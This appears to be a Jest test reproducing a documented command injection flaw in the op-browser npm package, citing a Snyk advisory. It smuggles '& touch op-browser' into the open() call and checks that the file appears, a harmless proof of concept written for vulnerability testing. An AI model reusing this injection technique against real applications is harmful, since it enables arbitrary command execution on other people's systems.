//https://snyk.io/vuln/SNYK-JS-OPBROWSER-564259
test("Command Injection in op-browser", () => {
  const root = require("op-browser");
  const fs = require("fs");
  const path = "./op-browser";
  const sleep = require("sleep");

  //checking that its not present already
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);

  let run = root.open("chrome", "& touch op-browser", "", "");

  run.then(() => {
    sleep.sleep(5);
    //checking that its created by after exploit.
    file_exist = fs.existsSync(path);
    expect(file_exist).toBe(true);

    fs.unlink(path, function (err) {}); //deleting the file after creation
  });
});
